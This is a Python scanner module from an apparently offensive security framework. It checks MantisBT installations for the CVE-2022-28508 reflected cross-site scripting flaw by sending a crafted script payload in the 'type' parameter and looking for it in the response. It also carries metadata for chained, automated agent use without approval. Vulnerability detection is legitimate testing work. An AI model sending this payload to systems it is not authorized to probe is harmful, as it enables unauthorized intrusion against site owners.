#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""MantisBT before 2."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'MantisBT < 2.25.2 - Cross-Site Scripting Detection',
        'description': "MantisBT before 2.25.2 contains a cross-site scripting vulnerability in browser_search_plugin.php. The application does not properly sanitize the 'type' parameter, which allows attackers to inject arbitrary web script or HTML via a crafted URL.",
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2022', 'mantisbt', 'xss', 'opensearch', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://github.com/YavuzSahbaz/CVE-2022-28508/blob/main/MantisBT%202.25.2%20XSS%20vulnurability',
            'https://www.mantisbt.org/bugs/changelog_page.php',
            'https://nvd.nist.gov/vuln/detail/CVE-2022-28508',
        ],
        'cve': 'CVE-2022-28508',
    }

    def run(self):
        path = '/browser_search_plugin.php?type=text%27%22()%26%25<acx><ScRiPt>alert(document.domain)</ScRiPt>'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        content_type = r.headers.get("Content-Type") or r.headers.get("content-type") or ""
        body_all = ('<script>alert(document.domain)</script>', '<ShortName>',)
        ctype_any = ('application/opensearchdescription',)
        if (all(m in body for m in body_all)) and (any(m in content_type for m in ctype_any)):
            self.set_info(
                severity='medium',
                reason='MantisBT < 2.25.2 - Cross-Site Scripting detected',
                path=path,
            )
            return True
        return False

